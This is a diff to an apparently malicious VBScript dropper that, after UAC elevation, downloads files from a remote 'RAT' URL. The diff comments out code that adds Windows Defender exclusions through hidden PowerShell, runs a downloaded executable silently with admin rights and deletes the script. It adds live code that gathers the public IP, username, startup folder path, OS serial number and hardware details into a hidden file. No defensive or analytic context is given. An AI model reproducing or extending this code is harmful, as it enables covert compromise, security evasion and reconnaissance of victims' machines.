@@ -37,16 +37,18 @@ ElseIf WScript.Arguments(0) = "uac_launched" Then
     End If
     On Error GoTo 0
 
-    ' Add the folder to Windows Defender exclusions (PowerShell) - Hidden Window
-    strPowerShellCommand = "powershell.exe -Command ""Add-MpPreference -ExclusionPath '" & strFolderPath & "'"""
-    objShell.ShellExecute "powershell.exe", "-WindowStyle Hidden -Command """ & strPowerShellCommand & """", "", "runas", 0
-    If Err.Number <> 0 Then
-        'WScript.Echo "Error adding exclusion: " & Err.Description
-        Err.Clear
-    Else
-        'WScript.Echo "Folder successfully excluded from Windows Defender."
-    End If
+'//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
+    ' Add the folder to Windows Defender exclusions (PowerShell) - Hidden Window
+    ' strPowerShellCommand = "powershell.exe -Command ""Add-MpPreference -ExclusionPath '" & strFolderPath & "'"""
+    ' objShell.ShellExecute "powershell.exe", "-WindowStyle Hidden -Command """ & strPowerShellCommand & """", "", "runas", 0
+    ' If Err.Number <> 0 Then
+    '     'WScript.Echo "Error adding exclusion: " & Err.Description
+    '     Err.Clear
+    ' Else
+    '     'WScript.Echo "Folder successfully excluded from Windows Defender."
+    ' End If
+'//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
     ' Array of files to download (***REPLACE WITH YOUR URLS AND FILENAMES***)
     arrFiles = Array( _
         Array("https://arth.imbeddex.com/RAT/hello.vbs", "hello.vbs"), _
@@ -88,31 +90,91 @@ ElseIf WScript.Arguments(0) = "uac_launched" Then
             'WScript.Echo "Failed to download file: " & strURL
         End If
     Next
+'//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+    ' ' Set the file name to execute
+    ' strExecutableFileName = "target_script.exe" ' The name of the file to execute
 
-    ' Set the file name to execute
-    strExecutableFileName = "target_script.exe" ' The name of the file to execute
-
-    ' Loop through downloaded files and check if it's the one we need to execute
-    For Each arrFile In arrFiles
-        strLocalFile = arrFile(1)
-        If LCase(strLocalFile) = LCase(strExecutableFileName) Then ' Case-insensitive comparison
-            strLocalPath = strFolderPath & "\" & strLocalFile
+    ' ' Loop through downloaded files and check if it's the one we need to execute
+    ' For Each arrFile In arrFiles
+    '     strLocalFile = arrFile(1)
+    '     If LCase(strLocalFile) = LCase(strExecutableFileName) Then ' Case-insensitive comparison
+    '         strLocalPath = strFolderPath & "\" & strLocalFile
 
             ' Execute the downloaded file
-            objShell.ShellExecute "cmd.exe", "/C """ & strLocalPath & """ >nul 2>&1", strFolderPath, "runas", 0
-            If Err.Number <> 0 Then
-                'WScript.Echo "Error running downloaded file: " & Err.Description
-                Err.Clear
-            Else
-                'WScript.Echo "Downloaded file executed."
-            End If
-        End If
+            ' objShell.ShellExecute "cmd.exe", "/C """ & strLocalPath & """ >nul 2>&1", strFolderPath, "runas", 0
+            ' If Err.Number <> 0 Then
+            '     'WScript.Echo "Error running downloaded file: " & Err.Description
+            '     Err.Clear
+            ' Else
+            '     'WScript.Echo "Downloaded file executed."
+            ' End If
+    '     End If
+    ' Next
+'//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+    ' Schedule the deletion of the script after a delay
+    ' strScriptPath = WScript.ScriptFullName
+    ' objShell.ShellExecute "cmd.exe", "/C del """ & strScriptPath & """", "", "", 0
+'//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+    'WScript.Echo "Finished."
+
+    
+    Set objXMLHttp = CreateObject("MSXML2.XMLHTTP")
+    Set objWScriptShell = CreateObject("WScript.Shell")
+    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
+    
+    ' Get the data
+
+    objXMLHttp.open "GET", "http://api.ipify.org", False
+    objXMLHttp.send
+    strPublicIP = objXMLHttp.responseText
+ 
+    Const ssfSTARTUP = &H7
+    Set oShell = CreateObject("Shell.Application")
+    Set startupFolder = oShell.NameSpace(ssfSTARTUP)
+    If Not startupFolder Is Nothing Then
+    startupFolderPath = startupFolder.Self.Path
+    End If
+
+    strUsername = objWScriptShell.ExpandEnvironmentStrings("%USERNAME%")
+
+    ' Create and open the text file in the same directory as the script
+    Set objFile = objFSO.CreateTextFile(strFolderPath & "\details.txt", True)
+    objFSO.GetFile(strFolderPath & "\details.txt").Attributes = 2 ' 2 = Hidden attribute
+
+    objFile.WriteLine "IP: " & strPublicIP
+    objFile.WriteLine "User: " & strUsername
+    objFile.WriteLine "Main Directory: " & strFolderPath
+    objFile.WriteLine "Startup Directory: " & startupFolderPath
+    objFile.WriteLine
+    objFile.WriteLine "Os info->"
+
+    
+    ' Operating System Information
+    Set colOperatingSystems = objWMIService.ExecQuery("Select * from Win32_OperatingSystem")
+    For Each objOperatingSystem in colOperatingSystems
+        objFile.WriteLine "Operating System: " & objOperatingSystem.Caption
+        objFile.WriteLine "Version: " & objOperatingSystem.Version
+        objFile.WriteLine "Build Number: " & objOperatingSystem.BuildNumber
+        objFile.WriteLine "OS Architecture: " & objOperatingSystem.OSArchitecture ' (32-bit or 64-bit)
+        objFile.WriteLine "Service Pack: " & objOperatingSystem.ServicePackMajorVersion & "." & objOperatingSystem.ServicePackMinorVersion
+        objFile.WriteLine "Install Date: " & objOperatingSystem.InstallDate
+        objFile.WriteLine "System Directory: " & objOperatingSystem.SystemDirectory
+        objFile.WriteLine "Windows Directory: " & objOperatingSystem.WindowsDirectory
+        objFile.WriteLine "Serial Number: " & objOperatingSystem.SerialNumber
+        objFile.WriteLine "Manufacturer: " & objOperatingSystem.Manufacturer
     Next
 
-    ' Schedule the deletion of the script after a delay
-    strScriptPath = WScript.ScriptFullName
-    objShell.ShellExecute "cmd.exe", "/C del """ & strScriptPath & """", "", "", 0
+    ' Computer System Information (for more hardware-related info)
+    Set colComputerSystem = objWMIService.ExecQuery("Select * from Win32_ComputerSystem")
+    For Each objComputer in colComputerSystem
+        objFile.WriteLine
+        objFile.WriteLine "Hardware info->"
+        objFile.WriteLine "Computer Name: " & objComputer.Name
+        objFile.WriteLine "Manufacturer: " & objComputer.Manufacturer
+        objFile.WriteLine "Model: " & objComputer.Model
+        objFile.WriteLine "Total Physical Memory: " & objComputer.TotalPhysicalMemory/1024/1024 & " MB" ' In MB
+    Next
 
+    objFile.Close
 
-    'WScript.Echo "Finished."
 End If
